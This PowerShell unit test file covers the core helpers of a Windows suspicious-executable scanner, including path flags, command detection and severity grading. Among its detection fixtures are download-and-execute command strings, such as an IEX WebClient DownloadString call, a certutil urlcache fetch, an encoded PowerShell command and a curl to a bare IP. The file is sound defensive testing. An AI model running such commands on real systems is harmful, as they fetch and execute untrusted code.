<#
    Test-CoreFunctions.ps1 - deterministic unit coverage for the pure helpers in
    Core.ps1 that the whole scanner leans on: path/command classification,
    severity grading, command-line parsing and subject-name extraction.

    These functions take a string and return a verdict with no I/O (Resolve-
    ExecutablePath touches the filesystem only for the ambiguous unquoted case,
    which we avoid here), so they can be asserted exactly without the real
    machine. Run after any change to the detection tables or grading logic.
#>

$repo = Split-Path $PSScriptRoot -Parent
. "$repo\lib\Core.ps1"

$script:pass = 0; $script:fail = 0; $script:fails = New-Object System.Collections.ArrayList

function Assert-True {
    param([string]$Name, [bool]$Condition, [string]$Because = '')
    if ($Condition) { $script:pass++ }
    else { $script:fail++; $null = $script:fails.Add("FAIL  $Name  $Because") }
}

function Assert-Eq {
    param([string]$Name, $Expected, $Actual)
    Assert-True $Name ("$Expected" -eq "$Actual") "(expected '$Expected', got '$Actual')"
}

# --------------------------------------------------------------------------
# Test-SuspiciousPath - location flags
# --------------------------------------------------------------------------
Assert-True 'path: user temp flagged' `
    ((Test-SuspiciousPath 'C:\Users\Zeke\AppData\Local\Temp\x\a.exe') -contains 'Runs from the user temp directory')
Assert-True 'path: roaming flagged' `
    ((Test-SuspiciousPath 'C:\Users\Zeke\AppData\Roaming\a.exe') -contains 'Runs from the roaming profile')
Assert-True 'path: public flagged' `
    ((Test-SuspiciousPath 'C:\Users\Public\a.exe') -contains 'Runs from the Public profile (world-writable)')
Assert-True 'path: recycle bin flagged' `
    ((Test-SuspiciousPath 'C:\$Recycle.Bin\S-1-5\a.exe') -contains 'Runs from the recycle bin')
Assert-True 'path: downloads flagged' `
    ((Test-SuspiciousPath 'C:\Users\Zeke\Downloads\a.exe') -contains 'Runs directly from the Downloads folder')
# AppData\Local\Programs is where legit per-user installers (VS Code) live - must NOT trip the bare local-AppData rule.
Assert-True 'path: AppData\Local\Programs not flagged as loose local AppData' `
    (-not ((Test-SuspiciousPath 'C:\Users\Zeke\AppData\Local\Programs\App\a.exe') -contains 'Runs from local AppData'))

# --------------------------------------------------------------------------
# Test-SuspiciousPath - strong filename-deception flags (must be exact strings)
# --------------------------------------------------------------------------
Assert-True 'path: double extension flagged' `
    ((Test-SuspiciousPath 'C:\Users\Zeke\Downloads\invoice.pdf.exe') -contains 'Filename uses a double extension')
Assert-True 'path: whitespace-padded extension flagged' `
    ((Test-SuspiciousPath 'C:\x\report.exe') -notcontains 'Filename pads the extension with whitespace') # sanity: normal name not padded
Assert-True 'path: whitespace pad real case' `
    ((Test-SuspiciousPath "C:\x\report   .exe") -contains 'Filename pads the extension with whitespace')
Assert-True 'path: bidi override flagged' `
    ((Test-SuspiciousPath "C:\x\innocuous$([char]0x202E)cod.exe") -contains 'Filename contains a bidirectional text override character')
Assert-True 'path: svchost outside System32 flagged' `
    ((Test-SuspiciousPath 'C:\Users\Zeke\AppData\Local\svchost.exe') -contains 'Masquerades as a Windows system binary but sits outside System32')
Assert-True 'path: svchost INSIDE System32 not flagged as masquerade' `
    ((Test-SuspiciousPath 'C:\Windows\System32\svchost.exe') -notcontains 'Masquerades as a Windows system binary but sits outside System32')
# clean cases
Assert-Eq 'path: clean Program Files -> no reasons' 0 (@(Test-SuspiciousPath 'C:\Program Files\App\app.exe').Count)
Assert-Eq 'path: empty string -> no reasons'        0 (@(Test-SuspiciousPath '').Count)
Assert-Eq 'path: null -> no reasons'                0 (@(Test-SuspiciousPath $null).Count)

# Every strong reason Test-SuspiciousPath can emit must be in the StrongPathReasons list (no drift).
foreach ($r in @(
    'Filename uses a double extension',
    'Filename pads the extension with whitespace',
    'Filename contains a bidirectional text override character',
    'Masquerades as a Windows system binary but sits outside System32')) {
    Assert-True "strongreason registered: $r" ($script:StrongPathReasons -contains $r)
}

# --------------------------------------------------------------------------
# Test-SuspiciousCommand
# --------------------------------------------------------------------------
$encHits = Test-SuspiciousCommand 'powershell.exe -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQA'
Assert-True 'cmd: -enc detected'          (@($encHits).Count -ge 1)
Assert-True 'cmd: -enc is Critical'       (@($encHits | Where-Object { $_.Severity -eq 'Critical' }).Count -ge 1)
Assert-True 'cmd: IEX detected High'      (@((Test-SuspiciousCommand 'IEX (New-Object Net.WebClient).DownloadString("http://x")') | Where-Object { $_.Severity -eq 'High' }).Count -ge 1)
Assert-True 'cmd: certutil urlcache Critical' (@((Test-SuspiciousCommand 'certutil.exe -urlcache -f http://x/a.exe a.exe') | Where-Object { $_.Severity -eq 'Critical' }).Count -ge 1)
Assert-True 'cmd: bare-IP http detected'  (@(Test-SuspiciousCommand 'curl http://185.234.72.9/a').Count -ge 1)
Assert-True 'cmd: UNC path detected'      (@(Test-SuspiciousCommand '\\evil-host\share\a.exe').Count -ge 1)
Assert-Eq   'cmd: clean -> no hits' 0     (@(Test-SuspiciousCommand 'C:\Program Files\App\app.exe --update').Count)
Assert-Eq   'cmd: empty -> no hits' 0     (@(Test-SuspiciousCommand '').Count)

# --------------------------------------------------------------------------
# Get-PathFlagSeverity
# --------------------------------------------------------------------------
$msSig      = [pscustomobject]@{ Exists=$true; IsMicrosoft=$true;  IsTrusted=$true }
$trustedSig = [pscustomobject]@{ Exists=$true; IsMicrosoft=$false; IsTrusted=$true }
$unsignedSig= [pscustomobject]@{ Exists=$true; IsMicrosoft=$false; IsTrusted=$false }
$noFileSig  = [pscustomobject]@{ Exists=$false;IsMicrosoft=$false; IsTrusted=$false }
$locFlag    = 'Runs from local AppData'
$strongFlag = 'Filename uses a double extension'

Assert-Eq 'grade: location + MS -> Info'          'Info' (Get-PathFlagSeverity -Reason $locFlag -Signature $msSig)
Assert-Eq 'grade: location + trusted -> Low'      'Low'  (Get-PathFlagSeverity -Reason $locFlag -Signature $trustedSig)
Assert-Eq 'grade: location + unsigned -> High'    'High' (Get-PathFlagSeverity -Reason $locFlag -Signature $unsignedSig)
Assert-Eq 'grade: location + missing file -> High' 'High' (Get-PathFlagSeverity -Reason $locFlag -Signature $noFileSig)
Assert-Eq 'grade: location + null sig -> High'     'High' (Get-PathFlagSeverity -Reason $locFlag -Signature $null)
Assert-Eq 'grade: strong flag + MS sig -> STILL High' 'High' (Get-PathFlagSeverity -Reason $strongFlag -Signature $msSig)
Assert-Eq 'grade: strong flag + trusted -> STILL High' 'High' (Get-PathFlagSeverity -Reason $strongFlag -Signature $trustedSig)

# --------------------------------------------------------------------------
# Get-WorstSeverity  (lower rank = more severe; Default acts as a floor)
# --------------------------------------------------------------------------
Assert-Eq 'worst: picks most severe'        'Critical' (Get-WorstSeverity @('Low','Critical','Info'))
Assert-Eq 'worst: empty -> default Info'    'Info'     (Get-WorstSeverity @())
Assert-Eq 'worst: ignores blanks'           'High'     (Get-WorstSeverity @('', 'High', $null))
Assert-Eq 'worst: default is a floor'       'High'     (Get-WorstSeverity @('Low','Medium') -Default 'High')
Assert-Eq 'worst: beats the floor'          'Critical' (Get-WorstSeverity @('Critical') -Default 'High')

# --------------------------------------------------------------------------
# Resolve-ExecutablePath  (only the no-filesystem paths)
# --------------------------------------------------------------------------
Assert-Eq 'resolve: quoted path with spaces + args' 'C:\Program Files\App\a b.exe' (Resolve-ExecutablePath '"C:\Program Files\App\a b.exe" --flag x')
Assert-Eq 'resolve: rundll32 targets the DLL'       'C:\Users\Zeke\AppData\Local\evil.dll' (Resolve-ExecutablePath 'rundll32.exe C:\Users\Zeke\AppData\Local\evil.dll,EntryPoint')
Assert-True 'resolve: empty -> null'                ($null -eq (Resolve-ExecutablePath ''))
Assert-True 'resolve: null -> null'                 ($null -eq (Resolve-ExecutablePath $null))

# --------------------------------------------------------------------------
# Expand-PathVariables  /  Get-CommonName
# --------------------------------------------------------------------------
Assert-True 'expand: %SystemRoot% resolves' ((Expand-PathVariables '%SystemRoot%\System32\a.exe') -notmatch '%SystemRoot%')
Assert-True 'expand: \SystemRoot\ prefix resolves' ((Expand-PathVariables '\SystemRoot\System32\a.exe') -match 'System32')
Assert-Eq   'cn: extracts common name' 'Microsoft Windows' (Get-CommonName 'CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond')
Assert-Eq   'cn: empty -> empty'       ''                  (Get-CommonName '')

# --------------------------------------------------------------------------
"" ; foreach ($f in $script:fails) { $f }
"===== Core: $script:pass passed, $script:fail failed ====="
if ($script:fail -gt 0) { exit 1 }
